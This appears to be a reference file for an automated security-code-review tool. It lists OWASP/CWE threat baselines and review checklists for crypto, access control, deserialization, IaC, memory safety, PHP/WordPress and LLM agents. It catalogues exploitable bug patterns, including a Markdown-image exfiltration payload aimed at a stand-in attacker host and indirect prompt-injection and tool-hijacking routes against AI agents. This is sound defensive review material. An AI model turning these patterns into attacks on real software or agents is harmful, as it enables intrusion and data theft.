<!-- Specialist lenses and threat-model baselines. -->
# secscan lenses & threat-model baselines

## Threat-model baselines (s2) — instantiate by repo kind

**web-api** (OWASP Top 10): A01 Broken Access Control (IDOR, path traversal,
forced browsing, priv-esc) · A02 Cryptographic Failures (weak/missing crypto,
plaintext secrets/transport) · A03 Injection (SQL/NoSQL/OS/LDAP/template/header)
· A04 Insecure Design (missing rate-limit, trust-boundary assumptions) · A05
Security Misconfiguration (default creds, debug on, permissive CORS) · A07
Identification & Auth Failures (weak session, missing MFA, JWT flaws) · A08
Software & Data Integrity Failures (unsafe deserialization, unsigned updates) ·
A10 SSRF · XSS (reflected/stored/DOM) · CSRF / state-changing GET.

**web-app** (server-rendered apps, CMS, plugins/extensions —
WordPress/Drupal/Laravel/Symfony): the OWASP-Top-10 spine of `web-api`, plus the
host-platform trust model — a plugin/extension runs INSIDE the host, sharing its
process, DB, auth, and privileges, so its single weakest endpoint exposes the
whole site. Emphasis: A01 missing capability/role checks on admin and
AJAX/`nopriv` actions (IDOR, priv-esc) · A03 Injection (SQLi via unparameterized
queries, stored/reflected/DOM XSS, PHP object injection via `unserialize`/
`phar://`, LFI via dynamic `include`) · A04 CSRF on state-changing forms/actions
(missing anti-CSRF token/nonce) · A05 Misconfiguration (debug/stack traces on,
exposed installer/`.env`/backups, directory listing) · A08 unrestricted file
upload → web-shell · A10 SSRF from server-side fetch helpers. Apply the `php`
and (for WordPress) `wordpress` lenses.

**mobile** (OWASP MASVS): M1 Improper Credential Usage (hardcoded keys, token
leakage) · M3 Insecure Auth/Authorization · M5 Insecure Communication (no cert
pinning, cleartext) · M8 Security Misconfiguration (exported components,
debuggable build) · M9 Insecure Data Storage (world-readable prefs, unencrypted
DB).

**native** (CWE memory-safety): CWE-119/787 Buffer overflow · CWE-416
UAF/double-free · CWE-190 Integer overflow → undersized alloc · CWE-134
Format-string · CWE-362 TOCTOU/race · CWE-78 OS command injection via
system()/exec().

**iac**: Over-permissive IAM/RBAC (wildcard actions, cluster-admin) · Public
network exposure (0.0.0.0/0 ingress, hostNetwork, public bucket) · Secrets
committed in plaintext/env · Privileged/root containers, missing securityContext
· Disabled TLS / unencrypted storage.

**library**: Injection via untrusted caller input (SQL/OS/path) · Unsafe
deserialization (pickle/yaml.load/XMLDecoder/ObjectInputStream) · Path traversal
in file-handling APIs · (+ API/supply-chain integrity).

STRIDE by entry-point kind: network = S T R I D E · ipc = T I E · file = T I D ·
cli = T E · deserialization = T E · other = T I.

---

## Specialist lenses (s4) — apply the ones that match

### crypto
Reviewing cryptography, key-handling, and security-protocol surfaces. Target
weaknesses exploitable mathematically or by abusing protocol negotiation — not
generic "uses MD5 somewhere" hygiene.
- Secret/HMAC/token equality with `==`/`equals`/`memcmp` instead of a
  constant-time comparator — early-exit leaks match length.
- Signature/JWT verification that reads the algorithm or key-id from the token
  and trusts it (alg=none, HS↔RS key confusion, kid path traversal).
- Symmetric encryption with constant/predictable/replayable IV/nonce (GCM nonce
  reuse = full authenticity compromise).
- Security-relevant randomness from non-CSPRNG (`Math.random`, `rand()`,
  `random.random`) for tokens, IVs, keys, OTPs, reset codes.
- TLS/signature verification wired up but not enforced — empty trust managers,
  hostname checks returning true, verify result ignored.
- Hard-coded keys/salts/passphrases in source or config; key bytes in logs.

### logic-bug
Behavioural / state-machine defects — no single grep signature; surface only by
reasoning about ordering, concurrency, and edge cases. **HARD GATE:** every
finding MUST cite the exact trust boundary crossed (file:line where untrusted
input enters, and file:line where the security decision is made on it). Both
sides internal (service-to-service, same trust domain, idempotent retry,
intentional design) → DROP.
- Check-then-act windows: between the check and the mutation, can a second
  request/thread/fs actor change what was checked?
- Auth/session state on empty/null/duplicated/out-of-order messages; concurrent
  requests leaving a session half-authenticated.
- Numeric identity/counters at overflow, zero, negative after narrowing cast; an
  ID truncated to 32-bit colliding with a privileged record.
- Connection/protocol state: malformed/truncated message leaving the parser
  mid-state so the NEXT request is misinterpreted.
- Caches/memoised decisions: cache key missing tenant/user/role; cached
  "authorised" outliving a revocation.
- Sentinel returns: indexOf/find (-1/null when absent) used as offset/length
  without the `== -1` guard; parseInt→NaN or null-lookup treated as success.

### access-control
Authorization expert. Hunt IDOR (BOLA), missing/incorrect authz, horizontal/
vertical priv-esc, multi-tenant isolation bypass. The bug is usually the
ABSENCE of a check — look for what is NOT there. **HARD GATE:** show (a) the
entry point and the identity it authenticates as, and (b) the object/resource
and WHERE ownership/tenant/role is verified for THAT object. If (b) exists and
is correct, DROP. "Endpoint requires login" is NOT authorization. A
FIXED/HARDCODED target (not derived from the request) is at most a single-record
issue — do not label it IDOR/BOLA.
- Enumerate every externally-reachable handler; for each, what object ID comes
  from the request and is it checked against the caller's identity/tenant?
- Direct object references: findById(request.id), file paths/S3 keys from
  request fields — can user A pass user B's ID?
- Missing guards: @PreAuthorize/@Secured on siblings but not this one;
  service methods callable from multiple controllers where only some check authz.
- Vertical escalation: admin ops reachable via non-admin routes; role checks
  trusting a claim from request body/JWT without signature verification.
- Mass assignment: request DTO bound directly to an entity letting a caller set
  owner_id/role/isAdmin/tenantId/price.
- Multi-tenant leakage: queries filtering by id but not tenant_id.
- Destructive bulk ops: deleteAll/truncate/"DELETE FROM t"/bulk UPDATE with no
  WHERE/owner/tenant scope reachable from a request — first-class high-impact.

### deserialization
Unsafe-deserialization expert. Hunt deserialization of attacker-influenced bytes
through libraries that invoke code during object reconstruction (dominant JVM
RCE vector). **HARD GATE:** requires BOTH (a) a deserializer call site and (b) a
path from untrusted input (HTTP body/header/param, MQ, file upload, cache, DB
blob written by another tenant) to it. Self-produced data, or data signed/HMAC'd
before serialize and verified before deserialize, is NOT a finding. Cite both.
- Java native: ObjectInputStream.readObject/readUnshared, readObject/readResolve
  overrides, RMI/JMX/JNDI, Commons SerializationUtils.
- Jackson: enableDefaultTyping/activateDefaultTyping, @JsonTypeInfo(use=CLASS),
  LaissezFaire validator, polymorphic Object/Serializable fields.
- XML: XMLDecoder, XStream without hardened allow-list, JAXB XmlAdapter
  instantiating by class name. YAML: SnakeYAML new Yaml() on untrusted input
  (only SafeConstructor is safe). Python: pickle/yaml.load.
- PHP: `unserialize()` on attacker bytes → POP/gadget chain (Monolog, Guzzle,
  Laravel/Symfony, or CMS-bundled gadgets) = RCE/file-write/SSRF. `phar://`
  deserialization — an attacker-controlled path into ANY file op (`file_exists`,
  `fopen`, `getimagesize`, `file_get_contents`, `unlink`, `md5_file`, `copy`)
  unserializes the Phar metadata (pre-8.0 default, still reachable). Mitigation
  check: `unserialize($x, ['allowed_classes' => false])`, or a JSON codec
  instead. WordPress `maybe_unserialize` on attacker-controlled option/meta is a
  live source — see the `php`/`wordpress` lenses.
- Others: Kryo, Hessian/Burlap, FST, Spring DefaultDeserializer, RedisTemplate
  with JdkSerializationRedisSerializer on shared Redis.
- Mitigation check: ObjectInputFilter/allow-list applied BEFORE readObject? If
  so, does the allow-list itself admit a known gadget?

### batch-etl
Batch/ETL data-pipeline expert. Target: file-in → transform → file-out job.
Attacker model: an upstream producer, scheduler/operator parameter, or shared
landing directory — NOT an interactive web user. **HARD GATE:** cite (a) the
externally-influenced value (job param, env var, upstream record field, filename
in a watched dir) and (b) the file:line where it reaches a path/command/SQL/
output record WITHOUT validation. Same trust domain + not settable by a
lower-privileged party → DROP.
- Job params/env vars into open()/Path()/shutil/os.remove without fixed
  base-dir + realpath check → path traversal as the batch service account.
- Output filenames/staging dirs derived from input record fields → traversal/
  collision via crafted records.
- Shared landing/spool dirs: glob or "newest by mtime" where any writer can
  plant a file (TOCTOU / untrusted producer).
- Fixed-width / COMP-3 / EBCDIC parsing: length from record header used to
  slice/seek without capping to buffer; sign/zone nibble unvalidated; off-by-one
  between COBOL 1-based and Python 0-based slices.
- Record-count/hash-total trailer not verified against the body.
- Emitted CSV/report cells from input written without stripping leading
  `= + - @` (formula injection into Excel consumers).
- subprocess/os.system invoking sort/sftp/gpg/db-loaders with args from job
  params or record fields. Idempotency/restart: checkpoint markers in a
  world-writable dir; rerun double-posts records.

### iac
Infrastructure-as-Code / cloud-config expert. Scope: Terraform/HCL, Dockerfiles,
K8s & Helm, GitHub Actions/GitLab CI/Jenkinsfiles, Ansible, docker-compose,
CloudFormation. **HARD GATE:** cite the specific resource block/step/directive
(file:line) AND the security property violated (least privilege, network
isolation, supply-chain integrity, secret hygiene). Aspirational best-practice
with no concrete attack path → LOW. Vendor-default = baseline → not a finding.
- **Terraform:** IAM `*` Action/Resource; AssumeRole without ExternalId
  cross-account; S3 without block_public_access/encryption; public RDS; SGs with
  0.0.0.0/0 on 22/3389/3306/5432/6379/9200/27017; hardcoded creds in args/
  user_data; SSM String not SecureString; CloudTrail/flow-logs off; KMS without
  rotation.
- **Dockerfile:** no USER / USER root; `ADD <URL>`, `RUN curl|sh`; secrets in
  ENV/ARG (visible in layers); unpinned `:latest`; `COPY . .` dragging .git/.env.
- **K8s/Helm:** runAsUser:0 / runAsNonRoot:false / missing securityContext;
  privileged/allowPrivilegeEscalation; capabilities SYS_ADMIN/NET_ADMIN/NET_RAW/
  SYS_PTRACE; hostPath mounting docker.sock or /,/etc,/proc,/sys; hostNetwork/
  hostPID/hostIPC; plaintext Secret data; SA bound to cluster-admin; LB/NodePort
  exposing internal services; missing NetworkPolicy.
- **CI:** `pull_request_target` + checkout of PR head ref + running scripts from
  the checkout → RCE with secret access; `${{ github.event.* }}` (issue/PR title,
  branch name) interpolated into a `run:` shell → script injection.

### memory-safety
Memory-corruption expert for code that processes untrusted bytes in a
memory-unsafe context: C/C++/Obj-C, Rust `unsafe`, cgo/JNI/FFI bindings, kernel
modules, parsers/decoders, network daemons, runtimes/JITs. **HARD GATE:** a
memory-corruption claim in a managed language (Java/C#/Go/Python/JS) is OUT OF
SCOPE (exclusion C) UNLESS the flaw is in a native/`unsafe`/FFI section — cite
that section. Verify every "this length is bounded" claim against the WORST-case
adversarial input, not the happy path; cite the input `source_ref` and the
corrupting `sink_ref`. An unreproduced corruption is a lead, not a confirmed
finding — prefer to demonstrate it (s6b).
- **Spatial (OOB r/w):** copy/loop bound computed as `a - b` where attacker makes
  `b > a` (unsigned underflow → ~SIZE_MAX); unparenthesized `+/-` length chains;
  `sizeof(*p)` vs `sizeof(elem)` pointer-depth confusion; attacker length field
  rebuilt into a fixed stack buffer with the bounds check missing/late or sized
  on the wrong headroom.
- **Temporal (UAF / lifetime):** a free path that skips a drain/invalidation a
  reachable waiter or wakeup path needs; a cached `base+offset` view surviving a
  realloc/grow that moved or replaced the backing store.
- **Type confusion:** a cast/union read that treats a pointer slot as a scalar
  (addrof) or writes a scalar into a pointer slot (fakeobj); a hierarchical
  walker (page-table/B-tree/extent) that checks a valid bit but not the leaf/size
  bit and descends into attacker-owned memory.
- **Value / uninit:** a MAX-sized buffer partially written then compared against
  attacker bytes with an observable, attacker-controlled compare length — the
  unwritten gap is a read oracle.
- **Kernel/privileged interfaces:** double-fetch (re-read of the same user
  address after a `copyin`/`copy_from_user` check); unbalanced retain/release on
  an externally-reachable object; unchecked downcast/dispatch-table index; a
  device node / ioctl / mgmt socket that validates the request SHAPE but never
  the caller's AUTHORITY over the named resource.
- **Universal move:** an incomplete/targeted patch points straight at a dangerous
  sink — re-scan the same function, sibling paths, and alternate callers for the
  same tainted-data→sink shape the fix missed.

### ai-llm
LLM/agent expert for code that puts a model in a trust-sensitive path: RAG,
tool/function-calling loops, MCP servers/clients, prompt assembly from untrusted
input, or code that consumes model output and acts on it. The dangerous flow is
`untrusted text → model → capability or sink`. **HARD GATE:** prompt injection
that only affects the attacker's OWN session and OWN output is not a finding —
require the injection to CROSS A BOUNDARY (reach a victim's context, invoke a
capability the requester lacks, exfiltrate data they can't see, or drive a
server-side SQL/shell/SSRF sink) and name the boundary. The bug is the missing
code-level gate, not the model's mood; a guardrail prompt ("never reveal…") is
NOT a security control. (This is distinct from exclusion E "prompt text passed to
an LLM" — that bars AI-governance content review, not a code-level
capability/sink crossing.)
- **Indirect injection:** attacker plants instructions in data the model later
  ingests in someone else's session (RAG doc, indexed page, file/email/issue
  body, tool response, filename). Trace each context source: who can write it,
  whose session does it fire in, what capability is worth hijacking.
- **Tool-argument injection:** model-generated tool args reach a real sink —
  `query(args.filter)`, `exec(args.cmd)`, `readFile(args.path)`, `fetch(args.url)`
  (SSRF). Validate at the handler like any request body; "the model produced
  structured output" is not validation.
- **Excessive agency / confused deputy:** tools run under the agent's own
  identity (service account, broad key) with no per-resource check scoped to the
  requesting user → IDOR-through-tools / priv-esc. Prove BOTH halves: no per-user
  check AND the action is one the user couldn't perform via a normal request. A
  shared credential scoped to the authenticated user's ID is safe — not a finding.
- **Insecure output handling:** model output rendered as HTML/Markdown without
  sanitization (stored/reflected XSS); the `![x](https://attacker/?d=<secret>)`
  Markdown-image exfil channel — but only if the render surface auto-loads remote
  resources and no CSP restricts it; unknown client → unverifiable, not a finding.
- **Context/tenant bleed:** conversation history, embeddings, or prompt/KV cache
  keyed too broadly; retrieval lacking a per-tenant ACL filter at query time.
  These are code bugs (bad cache key, unfiltered query) — verify in the
  storage/retrieval layer, not in model behavior.

### web-protocol
HTTP request-framing and auth-protocol expert for reverse proxies, CDNs,
gateways, custom HTTP servers/parsers, and anything implementing or consuming
sessions/JWT/OAuth-OIDC/SAML/password-reset. **HARD GATE — source-visibility:**
framing bugs (proxy chain), cache poisoning/deception (cache-key config), and
secret/token entropy frequently depend on components/config/values NOT in the
tree. If confirming needs something you cannot read, it is UNVERIFIABLE FROM
SOURCE — record it as a lead "requires deployment testing" with the exact
ambiguous bytes, do NOT emit it as a confirmed finding (an unconfirmable HIGH
downgraded to MEDIUM is still a false positive). Establish the client-vs-server
role first — don't fault a relying-party client for controls the IdP owns.
- **Framing / desync:** CL.TE / TE.CL / TE.TE / H2-downgrade discrepancies. Name
  BOTH components and the exact byte they parse differently; a single correct
  parser in isolation is not the bug.
- **Cache poisoning / deception:** an input that changes the response but is
  absent from the cache key (`X-Forwarded-Host/-Scheme`, custom headers, stripped
  cookies) → stored XSS against all consumers; or path/extension confusion
  (`/account/profile.css`) caching a per-user page as static.
- **Host / forwarded-header trust:** `Host`/`X-Forwarded-*` into a reset link,
  redirect, routing, or cache key. Highest-impact sink: password-reset link
  construction (token emailed to attacker's domain).
- **JWT verification defects:** `alg:none`; RS→HS key confusion; algorithm read
  from the token header not pinned server-side; decode-without-verify; missing
  `exp`/`aud`/`iss` checks; `kid`/`jku`/`x5u` taken from the token (path
  traversal / attacker-hosted key); weak/shared HMAC secret. Cite the
  `verify`/`decode` line and what it fails to check.
- **OAuth/OIDC & SAML:** substring/prefix `redirect_uri` match; missing/weak
  `state`; PKCE absent or `code_verifier` unchecked; `id_token` aud/iss/nonce
  unverified; SAML signature-wrapping/exclusion, XXE, comment-truncation, missing
  replay/`NotOnOrAfter`/`Audience`/`InResponseTo` checks — the bytes the signature
  covers ≠ the bytes read as identity.
- **Session/reset:** no rotation on login (fixation); still-valid after
  logout/password-change; predictable IDs (non-CSPRNG); reset token not bound to
  the user, reusable, or leaked via `Host`/`Referer`.
- **CRLF / header injection:** user input into `Location`/`Set-Cookie` with
  unescaped CR/LF — but verify the framework doesn't already strip it (many do).
- **Prove cross-user impact:** the payload must reach a victim's response (cache),
  request (smuggling), session (fixation), or inbox (reset). Attacker-only effects
  are hardening notes.

### client-side
Browser/client expert for SPAs, extensions, webviews — code the server never
executes (the fragment after `#`, `window.name`, `postMessage`, WebSocket data).
**HARD GATE:** a finding needs a controllable client SOURCE and an executing SINK
on the client path, and the impact must cross to a victim or across an origin
(XSS in the attacker's own DOM is not a finding). Server-side bug classes (SSRF,
authZ, path traversal) raised against pure client code are OUT OF SCOPE
(exclusion C) — enforcement belongs to the service. Framework auto-escaping
(React/Vue/Angular) is a real mitigation; the finding is where code opts OUT.
- **DOM XSS:** `location.hash/search/href`, `document.referrer`, `window.name`,
  `postMessage` data → `innerHTML`/`outerHTML`, `document.write`, `eval`,
  `Function`, string `setTimeout`, `element.src='javascript:'`, jQuery `.html()`,
  or an escape hatch (`dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrust*`,
  `$sce.trustAs*`). Server-side escaping never sees fragment/`window.name` data.
- **postMessage / CORS / WebSocket:** a `message` handler acting on `event.data`
  with no/weak `event.origin` check (`indexOf`/`startsWith`/unanchored regex);
  `Access-Control-Allow-Origin` reflecting the request Origin WITH
  `Allow-Credentials: true` (reflection+credentials, not a bare `*`); a WebSocket
  handshake authenticated only by ambient cookies with no Origin/CSRF check
  (CSWSH). Confirm the data drives a security-relevant action or credentialed read.
- **Prototype pollution:** an attacker-controlled key (`__proto__`,
  `constructor.prototype`) reaching a RECURSIVE/nested write (deep merge,
  `lodash.set`-style path assignment, nested query-string parse) landing on
  `Object.prototype` — AND a gadget that reads the polluted property. Shallow
  `Object.assign`/`JSON.parse` don't pollute; pollution with no reachable gadget
  isn't exploitable.
- **UI-redress / navigation:** a state-changing action framed with no
  `X-Frame-Options`/`frame-ancestors`/framebusting (clickjacking — require the
  action); a client-source navigation (`location = params.get('next')`, incl.
  `javascript:`/`data:`) with no allow-list. `target="_blank"` tabnabbing only
  where `rel="opener"`/`window.open` without `noopener` (modern browsers imply it).

### php
Server-side PHP dangerous-sink expert (plain PHP, CMS plugins/themes,
Laravel/Symfony/Drupal). Complements `access-control`/`crypto`/`deserialization`
with idioms unique to PHP's loose typing and stream wrappers. **HARD GATE:**
trace request input (`$_GET`/`$_POST`/`$_REQUEST`/`$_COOKIE`/`$_FILES`/`$_SERVER`,
`php://input`, framework request object) to the sink; cite source and sink
file:line. A superglobal read on its own is not a finding.
- **Object injection:** `unserialize()` on attacker bytes, and `phar://`
  deserialization through a file op on an attacker path — full detail in the
  `deserialization` lens. Confirm `allowed_classes => false` is absent.
- **Type-juggling auth bypass:** loose `==`/`!=` comparing secrets, tokens, or
  hashes; `strcmp($a, $b) == 0` where `$b` can be an array (returns NULL → `0`,
  bypass); magic-hash `0e…` collisions under `==` (`md5`/`sha1` of certain
  inputs); `in_array($x, $arr)` without the strict `true` third arg;
  `switch(true)` on loose cases. Fix is `===` / `hash_equals()`.
- **LFI/RFI:** request value into `include`/`require`(`_once`) — RFI if
  `allow_url_include`, otherwise LFI escalated via `php://filter`, `data://`,
  session/log poisoning, or an uploaded file → RCE; also user path into
  `file_get_contents`/`readfile`/`fopen` (arbitrary read + wrapper abuse).
- **Command exec:** `system`/`exec`/`passthru`/`shell_exec`/`proc_open`/`popen`/
  backticks with unescaped input; `escapeshellarg`/`escapeshellcmd` applied to
  the whole command line instead of each argument, or missing entirely.
- **Dynamic code / variable injection:** `eval`, `assert($input)` (evaluates a
  string pre-8.0), `create_function`, `preg_replace('/…/e', …)`;
  `extract($_REQUEST)` and `parse_str($qs)` (arbitrary variable overwrite);
  variable variables `$$name` / `$obj->$prop($args)` driven by input.
- **XXE:** `simplexml_load_*` / `DOMDocument->load*` / `XMLReader` on untrusted
  XML — flag `LIBXML_NOENT` (enables entity substitution) and note that
  `libxml_disable_entity_loader` is a no-op on PHP ≥ 8.0 (use `LIBXML_NONET`).
- **Header/mail injection:** raw input into `header()` (CRLF → response
  splitting / `Set-Cookie` injection) or into `mail()`'s `$additional_headers`
  (5th param) → SMTP header injection.

### wordpress
WordPress plugin/theme/core expert. WP's security model is mostly the ABSENCE of
specific calls — hunt for what is NOT there. The code runs INSIDE WordPress,
sharing its auth and DB, so any `nopriv`-reachable sink is internet-facing.
**HARD GATE:** cite the registered entry point (hook/route/handler at file:line)
AND the missing or bypassed control at the sink. Run the `php` lens in parallel
(WP is PHP). "Requires login" is not authorization; a nonce is not
authorization.
- **Entry points to enumerate:** `add_action('wp_ajax_{a}', …)` /
  `'wp_ajax_nopriv_{a}'`; `register_rest_route(..., 'permission_callback' => …)`;
  `admin_post_{a}` / `admin_post_nopriv_{a}`; `add_shortcode`; hooks on
  `init`/`template_redirect`/`admin_init` that read `$_REQUEST`; block
  `render_callback`; settings/form handlers. `_nopriv_` or
  `'permission_callback' => '__return_true'` = **unauthenticated**.
- **Missing capability check:** a state-changing or data-returning handler with
  no `current_user_can('…')` (or the wrong capability) → horizontal/vertical
  priv-esc (a subscriber invoking an admin action). `is_user_logged_in()` alone
  is not authorization.
- **Missing/incorrect nonce:** state-changing action with no
  `check_admin_referer` / `check_ajax_referer` / `wp_verify_nonce` → CSRF. Nonce
  present but capability absent (or vice-versa) is still a finding — WP needs
  both.
- **SQLi:** input interpolated into `$wpdb->query`/`get_results`/`get_var`/
  `get_col` without `$wpdb->prepare`; a `prepare()` whose placeholder is inside
  quotes (`'%s'`), or whose query is built by concatenation before `prepare`, is
  still injectable; table/column/`ORDER BY` names can't be placeheld — require an
  allow-list. `%i` (identifier) exists in WP ≥ 6.2.
- **XSS:** output echoed without `esc_html`/`esc_attr`/`esc_url`/`esc_js`/
  `wp_kses[_post]`; the classic reflected sink is `add_query_arg`/
  `remove_query_arg` echoed unescaped (they do NOT escape). Input side: missing
  `sanitize_text_field`/`sanitize_email`/`absint`/`wp_kses`. `the_content` /
  `do_shortcode` on attacker data is a stored-XSS sink.
- **Arbitrary file:** `$_FILES` handled without `wp_check_filetype_and_ext` /
  `wp_handle_upload` (a `.php` upload into a servable dir → web-shell);
  `unlink`/`wp_delete_file` on a request-derived path (traversal → arbitrary
  delete); `download_url`/`copy`/`file_put_contents` writing under the web root.
- **SSRF:** user URL into `wp_remote_get`/`wp_remote_post`/`wp_remote_request`
  (use `wp_safe_remote_*` + host allow-list), or `download_url` on a request URL
  with no scheme/host restriction.
- **Options/meta injection:** `update_option`/`update_user_meta`/
  `update_post_meta` with a request-controlled key or value (setting can flip
  privileged config); attacker-controlled meta later hydrated by
  `maybe_unserialize` → PHP object injection (see the `deserialization` lens).
